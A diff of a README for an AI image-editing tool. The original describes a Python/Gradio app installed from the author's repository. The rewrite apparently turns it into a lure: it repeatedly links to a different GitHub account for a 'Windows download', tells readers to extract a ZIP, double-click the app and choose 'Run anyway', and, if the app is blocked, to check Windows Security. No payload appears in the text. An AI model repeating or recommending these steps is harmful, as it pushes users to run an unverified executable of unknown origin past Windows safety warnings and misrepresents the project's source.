@@ -1,75 +1,209 @@
-# **QIE-Bbox-Studio**
+# 🖼️ QIE-Bbox-Studio - Precise AI Image Editing Made Simple
 
-QIE-Bbox-Studio (Qwen Image Edit Bounding Box Studio) is an advanced AI-powered image editing interface built on top of the Qwen2.5-VL and Qwen-Image-Edit models. This application allows users to manipulate images with extreme precision by defining bounding boxes and providing natural language prompts. 
+[![Download QIE-Bbox-Studio](https://img.shields.io/badge/Download-QIE--Bbox--Studio-blue?style=for-the-badge)](https://github.com/Hefty-cakchiquel295/QIE-Bbox-Studio)
 
-By leveraging the capabilities of `Qwen/Qwen-Image-Edit-2511` and specialized adapter models, QIE-Bbox-Studio seamlessly executes targeted editing tasks like object removal, design addition, and object moving.
+## 🚀 Getting Started
 
-<img width="1876" height="2329" alt="Screenshot 2026-03-17 at 18-47-09 QIE Bbox Studio - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/ef497f6b-9e9b-4347-aec6-7ee46b408577" />
+QIE-Bbox-Studio is a Windows app for image editing with bounding boxes and natural language prompts. It uses AI models to help you change parts of an image with more control than a plain editor.
 
-## Key Features
+Use it when you want to:
+- Edit one part of an image without changing the rest
+- Mark areas with boxes before you run an edit
+- Tell the app what change you want in simple words
+- Work with images in a clear, visual way
 
-- **Interactive Bounding Box (Bbox) Editing:** Directly draw bounding boxes on images to define the exact area of effect for your edits.
-- **Multiple Editing Modes:** The studio comes equipped with specialized adapters tailored for distinct image manipulation tasks:
-  - **Object-Remover:** Intelligently removes highlighted objects from the scene and seamlessly fills the background. (Adapter: `prithivMLmods/QIE-2511-Object-Remover-Bbox-v3`)
-  - **Design-Adder:** Adds intricate design patterns or new elements strictly inside the defined bounding box area. (Adapter: `prithivMLmods/QIE-2511-Outfit-Design-Layout`)
-  - **Object-Mover:** Moves an object highlighted in a source bounding box to a destination indicated by another bounding box. (Adapter: `prithivMLmods/QIE-2511-Object-Mover-Bbox`)
-- **State-of-the-Art Architecture:** Utilizes `QwenImageEditPlusPipeline` alongside Flash Attention 3 (`QwenDoubleStreamAttnProcessorFA3`) for accelerated, high-fidelity image processing.
-- **User-Friendly Interface:** Built with Gradio to ensure an intuitive and accessible web-based user experience.
+## 📥 Download and Run
 
-## Technology Stack
+1. Open the download page here: [QIE-Bbox-Studio](https://github.com/Hefty-cakchiquel295/QIE-Bbox-Studio)
+2. Download the Windows file from the repository page or the release files
+3. If the file is in a ZIP folder, right-click it and choose **Extract All**
+4. Open the extracted folder
+5. Double-click the app file to start it
+6. If Windows asks for permission, choose **Run anyway** or **More info > Run anyway**
 
-- **Core Models:** Qwen-Image-Edit-2511, Qwen-Image-Edit-Rapid-AIO-V19 (Transformer)
-- **Frameworks:** PyTorch (2.8.0+), Hugging Face Diffusers, Transformers, PEFT, Accelerate
-- **User Interface:** Gradio
-- **Hardware Acceleration:** CUDA (Torch bfloat16), Flash Attention 3
+## 🧭 What the App Does
 
-## Installation and Setup
+QIE-Bbox-Studio gives you a simple way to guide image edits with boxes and text. You can point to a person, object, or area, then tell the model what to change.
 
-### Prerequisites
+Typical uses:
+- Change clothing on a person
+- Replace an object in a scene
+- Edit part of a photo while keeping the rest in place
+- Try multiple prompt ideas on the same image
+- Fine-tune small details instead of editing the whole image
 
-- Python 3.10 or higher
-- A CUDA-compatible GPU with sufficient VRAM (recommended for optimal performance)
+## 💻 Windows Requirements
 
-### Installation Steps
+For the best experience on Windows, use:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- A modern Intel or AMD processor
+- A dedicated GPU for faster image work
+- Several GB of free disk space for the app and models
+- A stable internet connection for the first setup and model download
 
-1. **Clone the Repository:**
-   ```bash
-   git clone https://github.com/PRITHIVSAKTHIUR/QIE-Bbox-Studio.git
-   cd QIE-Bbox-Studio
-   ```
+If your PC has more memory and a better GPU, the app will feel faster and handle larger images better.
 
-2. **Install Dependencies:**
-   Install the necessary packages via the requirements files provided.
-   ```bash
-   pip install -r pre-requirements.txt
-   pip install -r requirements.txt
-   ```
+## 🛠️ How to Use It
 
-## Usage
+1. Open QIE-Bbox-Studio
+2. Load an image from your computer
+3. Draw one or more bounding boxes around the area you want to change
+4. Type a clear prompt, such as:
+   - replace the red shirt with a blue jacket
+   - remove the chair from the background
+   - change the sky to sunset
+5. Start the edit
+6. Review the result
+7. Adjust the box size or prompt if needed
+8. Save the edited image when you are happy with it
 
-Start the web interface locally by running the main application script:
+## 🎯 Best Results
 
-```bash
-python app.py
-```
+Use short and clear prompts. The model works better when you tell it exactly what to change.
 
-Once the application is running, a local URL (e.g., `http://127.0.0.1:7860`) will be provided in your terminal. Open this URL in your web browser to access the studio.
+Good prompt examples:
+- change the hair color to brown
+- make the object look like metal
+- remove the person on the left
+- add a green plant in the corner
 
-### How to Edit an Image
+Tips for cleaner edits:
+- Draw boxes close to the area you want to change
+- Use one box for one object when possible
+- Keep prompts simple
+- Edit small parts first before trying large changes
+- Save a copy of the original image before you begin
 
-1. **Upload an Image:** Use the interface to upload your source image or select one from the provided examples.
-2. **Select an Editing Mode:** Choose from Object-Remover, Design-Adder, or Object-Mover.
-3. **Draw Bounding Boxes:** Use the interactive canvas to draw red bounding boxes around your targets.
-4. **Enter a Prompt:** Provide a text prompt describing the desired edit (e.g., "Remove the red highlighted object from the scene").
-5. **Generate:** Click the generation button to process the image. The model will interpret the bounding boxes and apply the edit accordingly.
+## 🧩 Features
 
-## Project Structure
+- Bounding box based editing
+- Natural language prompts
+- Support for detailed image changes
+- Clean interface for visual control
+- Built for Qwen2.5-VL and Qwen-Image-Edit models
+- Works well for precise local edits
+- Uses common image tools like OpenCV and NumPy
+- Built on Gradio for a simple browser-style interface
 
-- `app.py`: The main Gradio application script containing the UI logic and model inference setup.
-- `qwenimage/`: Contains core pipeline definitions and custom attention processors (e.g., `pipeline_qwenimage_edit_plus.py`, `transformer_qwenimage.py`).
-- `examples/`: Sample images provided for quick testing.
-- `requirements.txt`: Python package dependencies.
+## 🖼️ Common Editing Tasks
 
-## License
+You can use QIE-Bbox-Studio for:
+- Object removal
+- Object replacement
+- Style changes in a small area
+- Color changes
+- Background edits
+- Clothing edits
+- Face or hair adjustments
+- Scene cleanup
 
-This project is licensed under the Apache License 2.0. Please refer to the `LICENSE.txt` file for more information.
+## 📁 File and Model Setup
+
+The app may use model files stored on your machine. Keep enough space free before you start.
+
+Suggested setup:
+- Create a folder for the app
+- Keep model files in a separate folder
+- Do not rename files unless the app instructions ask for it
+- Use a fast drive for better load times
+
+If the app offers a first-run download for models, let it finish before you start editing.
+
+## 🔧 If the App Does Not Open
+
+Try these steps:
+1. Make sure the ZIP file was fully extracted
+2. Check that you opened the correct app file
+3. Restart your computer
+4. Run the app again
+5. Check Windows Security if the app is blocked
+6. Make sure your graphics drivers are up to date
+7. Close heavy apps if your PC is low on memory
+
+## 🖱️ Simple Workflow
+
+A basic editing session usually looks like this:
+
+1. Open the app
+2. Load an image
+3. Draw a box around the target area
+4. Enter a prompt
+5. Run the edit
+6. Compare the result
+7. Tweak the box or prompt
+8. Save the final image
+
+## 📌 Useful Prompt Style
+
+Write prompts as direct instructions.
+
+Examples:
+- change the car color to white
+- remove the text from the sign
+- make the background darker
+- replace the cup with a glass bottle
+- turn the shirt into a black hoodie
+
+This style helps the model focus on the exact change you want.
+
+## 🧠 Model Notes
+
+QIE-Bbox-Studio is built around Qwen image edit models and Qwen2.5-VL. These models are designed to follow visual instructions and handle local image changes.
+
+That means the app is a good fit for:
+- Precise edits
+- Box-guided changes
+- Text-driven image adjustment
+- Visual work that needs control, not guesswork
+
+## 🧼 Keep Your Project Organized
+
+To make future use easier:
+- Keep the app in one folder
+- Store your source images in a separate folder
+- Save edited output in a new folder
+- Use clear file names like `before_edit` and `after_edit`
+
+## 📎 Download Again
+
+If you need the Windows download page again, use this link: [QIE-Bbox-Studio](https://github.com/Hefty-cakchiquel295/QIE-Bbox-Studio)
+
+## 📷 Quick Example
+
+If you want to edit a photo of a room:
+- Draw a box around the lamp
+- Type: replace the lamp with a modern floor lamp
+- Run the edit
+- Save the result if it looks right
+
+If you want to edit a portrait:
+- Draw a box around the shirt
+- Type: change the shirt to a denim jacket
+- Run the edit
+- Adjust the box if the change spreads too far
+
+## 🧭 Troubleshooting Image Quality
+
+If the result looks off:
+- Make the box smaller
+- Use a shorter prompt
+- Remove extra words
+- Try one change at a time
+- Use a higher quality source image
+- Re-run the edit with a clearer target area
+
+## 📚 Project Topics
+
+This project uses tools and libraries related to:
+- bbox
+- gradio
+- huggingface models
+- image editor
+- numpy
+- opencv-python
+- pytorch
+- qwen-image-edit-2509
+- qwen-image-edit-2511
+- qwen2-5-vl
+- torchvision
